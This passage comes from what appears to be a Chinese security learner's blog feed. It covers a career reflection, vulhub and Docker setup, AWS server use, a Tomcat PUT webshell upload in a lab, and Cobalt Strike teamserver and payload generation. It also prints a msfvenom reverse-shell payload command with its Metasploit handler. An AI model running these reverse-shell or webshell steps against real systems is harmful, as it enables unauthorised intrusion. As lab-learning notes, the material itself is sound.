code-wrapper"><pre><code class="hljs applescript">乙方工作十分辛苦，有能力去甲方尽量去甲方<br><br>挖<span class="hljs-number">0</span><span class="hljs-built_in">day</span>的话，专门研究一个厂商的漏洞就够了<br></code></pre></div></td></tr></table></figure><p>以上是前辈给的经验。要好好考虑下职业规划的事情了。</p><h2 id="10月28日"><a href="#10月28日" class="headerlink" title="10月28日"></a>10月28日</h2><p>大吉大利，最终我还是拿到还是去乙方渗透测试岗offer了，校招比社招要简单。</p><h2 id="一点看法"><a href="#一点看法" class="headerlink" title="一点看法"></a>一点看法</h2><p>我写这篇对公司的看法并不是说，说公司的坏话。实际上，在第一次实习的时候，有公司的管理者曾跟我说，对公司有任何建议和看法都可以提出来。我非常感动，因为我只是个小小的实习生。也许他只是随口一说，并没有真的认为真的认为我可以提出任何有建设性的意见。但我认为这种听取意见的态度是任何人都值得学习的。</p><p>在绿盟成都分部，只有几位经常来公司的安全服务人员，就规模来说，没有360人数多。据说360在安全业内是数以数二的规模和实力强大的企业了。</p><p>绿盟安服人员收入构成: 绿盟的客户主要是国企、事业单位（学校、医院等）以及一些省内企业的IT资产。所以有时候“技术”不是最重要的，不是说不重要。因为客户也不懂技术，销售以及对于表面功夫也很重要。比如说，管理者（总监）根本不懂技术也是可以理解的。</p><p>比如说，应届生培训并不是某类技术的深入传授，而是各种东西都要会，例如等级保护、渗透测试、APP测试、应急响应等，而这些都是很高深的东西吗？不是，或者也可以说是，因为单独的某一个方向，都是可以无限深挖的，而安全服务人员往往被要求使用工具参照指导手册来生成可以提交给客户的“成果”——一份像模像样的报告。</p><p>“有时候，要搞好人际关系，比搞技术更重要，要给XX送礼…… “这是公司内某人跟我说的原话。我对此的看法是，因为技术性不那么强，所以在A可以B也可以的情况下，有权利的人更愿意选择自己喜欢的人。社会就是如此。参见娱乐圈，有权利的人可以潜规则明星，明星是自愿的来换取自己想要的角色。人性如此，任何地方都不是净土，可以理解。</p><p>实际上，在做项目的时候，尤其是CTF培训，我感觉到技术并不是很重要，因为要用的都是很简单很浅的东西，而表达能力和沟通能力更重要。而这正好戳到了我的短处，绕开了我的长处。</p><p>对实习生来说，他们最大的优点是”便宜“，一个月只有两千多的工资，可以说是除了租房吃饭所剩无几。而这就是资本主义社会要达到的目的。让你为金钱工作、无休止的整日奔波吧。</p><p>而对于正式员工来说，他们要掌握的是各种项目的交付能力，能做的项目越多，对公司的盈利能力就越强，所以杂而不精（这点是我从其他人的文章中看的，有待商榷）。</p><p>从可替代性来说，35岁以后，安全服务工作的技术工作被年轻人取代的可能性也是非常大的，如果一直呆在这个企业，从事管理也是个选项吧。实际上，很多公司也是如青楼，不许人间有白头，老龄化社会延迟退休（俗称推迟发放养老金）是迟早的事情，自己早做打算吧。</p><p>指望自己“便宜”，来增加竞争力是可悲而被动的。</p><p>说了这么多，其实我还是很想留在绿盟的。tk教主曾经在绿盟呆了10余年，离职的原因是钱太少。。当然是对大佬来说，而对于普通技术员工，9K以上，也不能算太少了，当然不能跟房价相比。但是能凭借工资买房的工作在社会上也没有太多。而且绿盟的优点也十分显而易见，在绿盟的管理十分宽松，早上9点上班下午5点半下班。只要完成自己的本职任务，上班可以做自己的事情。业余挖挖漏洞赚奖金也是美滋滋。</p><p>这是我的一点浅显的看法，有任何意见可以给我发邮件指出。感谢阅读。</p>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aws与vulhub（五）</title>
    <link href="/2019/09/18/11-x/"/>
    <url>/2019/09/18/11-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://vulhub.org/#/docs/">https://vulhub.org/#/docs/</a></p><p><a href="https://whale3070.github.io/tools/2019/08/25/06-x/">上一篇：docker compose与vulhub（四）</a></p><p>上一篇我们讲了在本地kali大家vulhub，但是受本地网速、硬盘存储空间所限，不能达到理想效果。</p><p>而在亚马逊云使用vulhub，网速可以达到近20MB/s，可以在数秒之内完成docker实例的搭建，不可以不谓之理想。</p><p>下载安装在之前讲过，这里省略。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>cd 漏洞目录，例如<br>cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/vulhub-master/</span>struts2/s2-<span class="hljs-number">005</span><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/vulhub-master/</span>tomcat/CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">12615</span><br><span class="hljs-regexp">//</span>搭建docker实例<br>docker-compose build<br><br><span class="hljs-regexp">//</span>开启docker实例<br>docker-compose up -d<br><br><span class="hljs-regexp">//</span>测试docker实例是否开启了web服务<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span><br></code></pre></div></td></tr></table></figure><h2 id="遇到的错误"><a href="#遇到的错误" class="headerlink" title="遇到的错误"></a>遇到的错误</h2><p>提示端口已经被使用时，修改yml文件，端口修改为8080。然后使用rinetd，将本地端口转发到外网可访问端口。问题解决。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-18-11/11.PNG" alt="11"></p><p>端口转发工具rinetd</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">apt-get install rinetd<br>vi <span class="hljs-regexp">/etc/</span>rinetd.conf<br><br><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">8080</span> 外网IP <span class="hljs-number">8080</span><br><span class="hljs-regexp">//</span>末尾添加这一行<br><br>pkill rinetd  <span class="hljs-comment">##关闭进程</span><br>rinetd -c <span class="hljs-regexp">/etc/</span>rinetd.conf  <span class="hljs-comment">##启动转发</span><br></code></pre></div></td></tr></table></figure><p>这样配置以后，访问<code>http://外网IP:8080</code>相当于访问<code>http://127.0.0.1:8080</code></p><h2 id="tomcat-put方式上传webshell"><a href="#tomcat-put方式上传webshell" class="headerlink" title="tomcat put方式上传webshell"></a>tomcat put方式上传webshell</h2><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615">参考资料</a></li></ul><p>使用curl可以直接上传一个html文件，但是不能上传jsp文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-18-11/12.PNG" alt="12"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-18-11/13.PNG" alt="13"></p><p>使用burp repeater，修改两个参数，PUT参数，22.jsp后面要加一个斜杠。因为linux的文件名不支持斜杠，而web服务器会忽略文件最后的斜杠。</p><p>在图片中201 Created 是一个代表成功的应答状态码，表示请求已经被成功处理，并且创建了新的资源。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-18-11/14.PNG" alt="14"></p><p>用文件末尾加/的方式，成功上传了webshell。</p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike （一）</title>
    <link href="/2019/09/16/10-x/"/>
    <url>/2019/09/16/10-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料： </p><ul><li><a href="https://www.cobaltstrike.com/support">cs官网</a></li><li><a href="https://www.cobaltstrike.com/downloads/csmanual314.pdf">csmanual314 PDF</a></li><li><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></li><li><a href="https://mp.weixin.qq.com/s/7UZsew9zkLd-LX9JDwJ4cQ">Cobaltstrike系列教程</a></li></ul><hr><p>这个软件是内网渗透、APT的软件，基于服务端/客户端构架，适用于多人合作。</p><h2 id="安装java环境"><a href="#安装java环境" class="headerlink" title="安装java环境"></a>安装java环境</h2><p>Use Oracle’s Java implementation for the best Cobalt Strike experience.<br>最好使用Oracle’s Java implementation这个环境，但是我对java不是很熟悉，就没有安装，直接使用kali自带的open jdk。</p><p><a href="https://www.digitalocean.com/community/tutorials/how-to-install-java-with-apt-get-on-ubuntu-16-04">how-to-install-java-with-apt-get-on-ubuntu-16-04</a></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">su root<br>apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>apt-<span class="hljs-keyword">get</span> -f install software-properties-common<br>apt-<span class="hljs-keyword">get</span> install <span class="hljs-keyword">default</span>-jre<br>apt install <span class="hljs-keyword">default</span>-jdk<br></code></pre></div></td></tr></table></figure><hr><p>yum install jdk-12.0.2_linux-x64_bin.rpm</p><hr><p>第一步，现在网上下载一个cobalt strike</p><p>运行环境：linux平台+java环境</p><p>服务器有两个主要的参数和两个次要的参数，</p><blockquote><p>主要参数：<br>团队服务器的外部可达IP<br> 团队成员连接客户端来使用的密码</p></blockquote><blockquote><p>次要参数：<br>第三个选项是可选的，没看懂。<br>第四个，设置payload过期的时间，格式为YYYY-MM-DD</p></blockquote><p><code>./teamserver 设置服务器的IP 任意设置一个密码</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/1.PNG" alt="1"></p><p>上图是一串SHA256 hash，在团队成员连接服务器时候，验证身份用的。</p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/3.PNG" alt="3"><br>点击connect，然后对比fingerprint，是否和服务端一致，防止中间人攻击。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/4.PNG" alt="4"></p><p>方式一：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">chmod <span class="hljs-selector-tag">a</span>+x cobaltstrike<br>./cobaltstrike<br></code></pre></div></td></tr></table></figure><p>方式二：</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>cobaltstrike.<span class="hljs-keyword">jar</span><br></code></pre></div></td></tr></table></figure><hr><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> (服务器设置的地址,客户端将会连接这个地址)<br><span class="hljs-symbol">port:</span> <span class="hljs-number">50050</span> (默认地址)<br><span class="hljs-symbol">user:</span> whale (你在团队中的昵称)<br><span class="hljs-symbol">password:</span> pass  (服务器设置的密码)<br></code></pre></div></td></tr></table></figure><p>一旦和服务器建立连接，你的团队会</p><ul><li>使用同样的session</li><li>分析主机，捕获的数据，和下载的文件</li><li>和共享的事件日志建立交流。</li></ul><p>客户端也可以连接多个team server。</p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>虚拟机NAT模式，运行cobalt不行，提示地址已经被占用。</p><p>如果使用虚拟机，请使用桥接，没有单独IP的，则使用host-only模式。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/2.PNG" alt="2"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/5.PNG" alt="5"></p><h2 id="payload上线"><a href="#payload上线" class="headerlink" title="payload上线"></a>payload上线</h2><p>cs可以生成一段恶意代码，在目标系统运行以后这段恶意代码，即可在cs上上线，达到控制目标的目的。</p><p>在本地运行ps1脚本，发现被comodo自动拦截了。</p><ol><li><p>添加监听器<br><code>cobalt strike -- listeners -- add/edit</code><br>设置监听的外网IP/端口</p></li><li><p>生成攻击payload<br><code>attacks -- packages -- payload generator/ windows_executable</code></p></li><li><p>将payload上传到目标机器执行。</p></li></ol><p>这里我在自己的电脑上运行了payload，顺便检测了一波comodo杀毒的能力，表示效果不错哈哈~<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/6.PNG" alt="6"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/8.PNG" alt="8"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-16-10/9.PNG" alt="9"><br>其他功能下次再研究下吧。。</p>]]></content>
    
    
    <categories>
      
      <category>cobaltstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWS亚马逊云服务器使用（二）</title>
    <link href="/2019/09/13/12-x/"/>
    <url>/2019/09/13/12-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/tools/2019/08/31/10-x/">AWS亚马逊云服务器搭建与使用</a></p><h2 id="绑定弹性IP"><a href="#绑定弹性IP" class="headerlink" title="绑定弹性IP"></a>绑定弹性IP</h2><p>参考资料：<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html</a></p><p><code>弹性IP</code>是aws的一个特性，它可以分配给A实例，当你不想要A实例的时候，又可以分配给B实例。于是IP是不变的，但是IP对应的机器却变了。这样比较方便，使用者完全感受不到底层的变化。</p><p>当我们把<code>弹性IP</code>和<code>实例</code>关联以后，就不用担心IP会变化了。如果不使用<code>弹性IP</code>，实例重启后，分配的IP可能会改变。</p><hr><p><code>ifconfig</code>，只有两个网卡，一个内网地址、一个本地环回地址。没有外网IP。</p><p>亚马逊云服务器外网IP与内网IP之间是通过一对一的NAT实现的，内网Ip配置在网卡上，外网Ip配置在网关上。如有需要绑定IP的场景，直接绑定内网IP即可，可以转发到外网IP上</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/1.PNG" alt="1"></p><p>第一步：<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/2.PNG" alt="2"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/3.PNG" alt="3"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/5.PNG" alt="5"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/6.PNG" alt="6"></p><h2 id="msf绑定外网ip失败"><a href="#msf绑定外网ip失败" class="headerlink" title="msf绑定外网ip失败"></a>msf绑定外网ip失败</h2><p>当在aws上部署msf的时候，监听外网IP，却提示<code>Handler failed to bind to 本地外网IP</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/7.PNG" alt="7"></p><p>于是测试一下，msf监听，反弹shell是否能反弹成功。</p><p>aws监听：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -H aws外网IP -P <span class="hljs-number">6678</span> -p linux/x<span class="hljs-number">86</span>/meterpreter/reverse_tcp<br></code></pre></div></td></tr></table></figure><p>目标机器：执行payload.elf</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=aws外网IP <span class="hljs-attribute">LPORT</span>=6678 -f elf -o payload.elf<br><br>./payload.elf<br></code></pre></div></td></tr></table></figure><p>aws确实是可以反弹成功的。</p><p>所以handler绑定失败是正常的，提示在0.0.0.0监听，意思是监听所有网卡的该端口。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/09-13-12/7.PNG" alt="7"></p><h2 id="扩大硬盘空间"><a href="#扩大硬盘空间" class="headerlink" title="扩大硬盘空间"></a>扩大硬盘空间</h2><p>aws EC2默认只有8GB，当要存储需要用的软件时，空间不够，可以选择扩大卷。</p><p><a href="https://amazonaws-china.com/cn/blogs/china/amazon-ebs-elastic-volumes/">https://amazonaws-china.com/cn/blogs/china/amazon-ebs-elastic-volumes/</a></p><p><a href="https://kionf.com/2017/11/15/linux-aws-ebs/">https://kionf.com/2017/11/15/linux-aws-ebs/</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWS亚马逊云服务器搭建与使用</title>
    <link href="/2019/08/31/10-x/"/>
    <url>/2019/08/31/10-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/tools/2017/01/01/%E7%BF%BB%E5%A2%99vpn/">翻墙VPN</a></p><p>参考资料：<a href="https://www.juelingzi.com/zb_users/upload/2019/06/201906051559734213487726.pdf">https://www.juelingzi.com/zb_users/upload/2019/06/201906051559734213487726.pdf</a></p><p><a href="https://www.fuwuqizuyong.cc/1038.html">亚马逊云设置防火墙</a></p><hr><p>VPS（Virtual Private Server）是虚拟专用服务器的缩写，渗透测试常常需要一个公网IP，用来反弹shell，或者用来部署awvs等扫描软件。所以让我们看看亚马逊云怎么使用吧！</p><p>第一年亚马逊云的套餐是免费的。注册验证邮箱、手机号、信用卡，就可以使用了。</p><p>这里说一下我用过的vps，一开始用的搬瓦工，还可以就是速度慢，除了翻墙没做其他用途。</p><p>后来想找个快一点的，就买了vultr，一个月3.5$，人民币25左右。这时候我除了用来翻墙还可以做辅助渗透的时候使用。</p><p>再后来，要搭建awvs在服务器上，这样当本地计算机关机了，也可以在服务器日夜不休的扫描。我就入手的hostkvm。hostkvm远程连接控制台的速度，和vultr相比就像一个飞机、一个绿皮火车一样。当然，价格也是一样。一个月要七八十元。</p><p>作为一个贫穷的青年，我琢磨着办个信用卡，蹭各大公司的云来使用。例如google云、aws云，首年免费。</p><h2 id="使用指南"><a href="#使用指南" class="headerlink" title="使用指南"></a>使用指南</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-31-10/9.PNG" alt="9"></p><p>按照提示创建一个实例后，获得了一个xx.pem文件。</p><p>点击EC2 Dashboard，复制实例ID和公有DNS，用ssh连入即可使用vps。</p><p><code>chmod 400 xx.pem</code>修改ssh的权限为仅本人可写</p><p><code>ssh -i xx.pem ec2-user@公有DNS</code></p><p>ec2-user是固定的，无需根据自己的配置修改<br>公有DNS就是服务器的公网IP，也可以使用域名连接。IP和域名都是aws云分配的。</p><p>然后参考<a href="https://whale3070.github.io/tools/2019/07/10/10-x/">shadowsocks一键运行script</a>，可以设置翻墙。</p><p>最后在aws控制面板，开放你设置ss的监听端口。因为aws默认只允许22端口ssh连入，不修改防火墙策略的话，外网就无法连接其他端口。</p><h2 id="安装PTF渗透测试框架"><a href="#安装PTF渗透测试框架" class="headerlink" title="安装PTF渗透测试框架"></a>安装PTF渗透测试框架</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/trustedsec/</span>ptf <span class="hljs-regexp">/opt/</span>ptf<br>cd <span class="hljs-regexp">/opt/</span>ptf &amp;&amp; ./ptf<br>use modules<span class="hljs-regexp">/exploitation/i</span>nstall_update_all<br>use modules<span class="hljs-regexp">/intelligence-gathering/i</span>nstall_update_all<br>use modules<span class="hljs-regexp">/post-exploitation/i</span>nstall_update_all<br>use modules<span class="hljs-regexp">/powershell/i</span>nstall_update_all<br>use modules<span class="hljs-regexp">/vulnerability-analysis/i</span>nstall_update_all<br><span class="hljs-keyword">exit</span>  退出ptf框架<br>cd /pentest 查看安装的modules<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-31-10/1.PNG" alt="1"></p><p>安装渗透测试框架PTF完成后，最后建立一个快照，就ok了。<a href="https://aws.amazon.com/cn/ec2/snapshot/">亚马逊快照建立的方法</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker compose与vulhub（四）</title>
    <link href="/2019/08/25/06-x/"/>
    <url>/2019/08/25/06-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://whale3070.github.io/tools/2019/08/19/07-x/">https://whale3070.github.io/tools/2019/08/19/07-x/</a></p><p>在上一篇中，我用kali安装了docker，使用了dockerfile来新建容器。这次学习一下docker compose。</p><h2 id="dockerfile与compose有什么区别"><a href="#dockerfile与compose有什么区别" class="headerlink" title="dockerfile与compose有什么区别"></a>dockerfile与compose有什么区别</h2><p>dockerfile与build命令是<strong>从无到有</strong>构建新镜像</p><p>而compose是组合多个镜像，例如需要构建一个python flask应用，该应用需要python环境，需要redis数据库，那么用docker compose就可以将多个<strong>已有的image组合</strong>在一起，形成新的image。</p><p>docker官方推荐每个docker容器只运行1个进程。所以当我们需要多个image的时候，就可以使用compose进行管理。</p><h2 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h2><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">pip install -U docker-compose<br>docker-compose <span class="hljs-comment">--version</span><br></code></pre></div></td></tr></table></figure><p>compose 是组成的意思</p><h2 id="python-flask案例"><a href="#python-flask案例" class="headerlink" title="python flask案例"></a>python flask案例</h2><p>源码下载地址：<a href="https://github.com/guanwei/dockerbook-code/tree/master/7/composeapp">https://github.com/guanwei/dockerbook-code/tree/master/7/composeapp</a></p><p>第一步，构建新的image。图中的文件都可以在上面的链接中进行下载。<br><code>docker build -tjamtur01/composeapp .</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-25-06/1.PNG" alt="1"></p><p>第二步，需要一个yml文件<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-25-06/2.PNG" alt="2"></p><p>使用<code>docker-compose up</code>，组合容器。<code>docker-compose up -d</code> 可以后台模式运行。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-25-06/6.PNG" alt="6"></p><p>访问浏览器本地的5000端口，即可。ctrl+c 关闭正在运行的服务<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-25-06/5.PNG" alt="5"></p><p><code>docker-compose ps</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-25-06/7.PNG" alt="7"></p><p>可以看到正在运行的所有服务，刚刚开启的redis服务器以及flask web服务。</p><h2 id="compose命令"><a href="#compose命令" class="headerlink" title="compose命令"></a>compose命令</h2><h3 id="compose日志"><a href="#compose日志" class="headerlink" title="compose日志"></a>compose日志</h3><p><code>docker-compose logs</code></p><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><p><code>docker-compose stop</code></p><p>或者<code>docker-compose kill</code></p><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p><code>docker-compose rm</code></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>当遇到<code>Cannot connect to the Docker daemon... </code>的错误时</p><p>运行<code>service docker start</code> 开启docker服务</p><h2 id="vulhub使用指南"><a href="#vulhub使用指南" class="headerlink" title="vulhub使用指南"></a>vulhub使用指南</h2><p>好了，刚刚我们已经介绍了docker compose的使用，那么用vulhub来搭建漏洞环境也是得心应手的事情了<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md">vulhub使用指南</a></p><p>按照上述链接中，下载该项目，切换到项目，用docker-compose下载必须的容器运行，即可。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-25-06/8.PNG" alt="8"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker安装踩坑指南（三）</title>
    <link href="/2019/08/19/07-x/"/>
    <url>/2019/08/19/07-x/</url>
    
    <content type="html"><![CDATA[<p>本文只讲使用，不讲原理。原理请看《第一本docker书》</p><p>参考资料：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/71775948">https://zhuanlan.zhihu.com/p/71775948</a></li><li><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></li></ul><hr><h1 id="docker镜像是什么？"><a href="#docker镜像是什么？" class="headerlink" title="docker镜像是什么？"></a>docker镜像是什么？</h1><p>docker image是相当于工厂中的原型。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/1.jpg"></p><p>docker方便在可以在仓库中取回各种各样的原型，然后再修改配置，方便我们自己的使用。而且改完的配置，还可以给别人使用。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/2.jpg"></p><h2 id="virtualBox"><a href="#virtualBox" class="headerlink" title="virtualBox"></a>virtualBox</h2><p><code>右ctrl</code>离开虚拟机输入<br><code>右ctrl + c</code> 切换视图，隐藏菜单到窗口模式</p><p><a href="https://blog.csdn.net/textboy/article/details/48293731">virtualbox增强功能</a>，可以自由扩展虚拟机的大小。如果没有安装，则虚拟机的大小是固定的，比较不方便。</p><h2 id="查看本地镜像"><a href="#查看本地镜像" class="headerlink" title="查看本地镜像"></a>查看本地镜像</h2><p><code>docker img</code></p><h2 id="下载服务器的镜像"><a href="#下载服务器的镜像" class="headerlink" title="下载服务器的镜像"></a>下载服务器的镜像</h2><p><code>docker pull ubuntu:12.04</code></p><h2 id="查看服务器提供了哪些镜像"><a href="#查看服务器提供了哪些镜像" class="headerlink" title="查看服务器提供了哪些镜像"></a>查看服务器提供了哪些镜像</h2><p><code>docker search kali</code></p><p>这条命令会查找仓库中所有可用的image</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/11.PNG" alt="11"></p><p>查找到以后，用<code>docker pull ctarwater/kali-msf</code>，即可下载一个想要的镜像到本地。</p><h2 id="修改本地镜像"><a href="#修改本地镜像" class="headerlink" title="修改本地镜像"></a>修改本地镜像</h2><p>当从仓库中取回了镜像，就可以在本地修改镜像了。</p><h3 id="docker-commit"><a href="#docker-commit" class="headerlink" title="docker commit"></a>docker commit</h3><p>commit是提交的意思，可以用该命令修改容器的配置。举个例子。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">apt-get -y install apache2<br><span class="hljs-keyword">exit</span><br>docker commit 指定容器 自动逸新的容器名称<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/12.PNG" alt="12"></p><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><p>dockerfile类似一个linux shell脚本，它使用的语法是被称为DSL的一种语言。暂时我们不涉及学习这种语言的编写。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/master/</span>base<span class="hljs-regexp">/weblogic/</span>Dockerfile<br><br>docker build -t myimg/ubuntu:v1 .<br><br>当前目录下有个名为Dockerfile的文件，用build 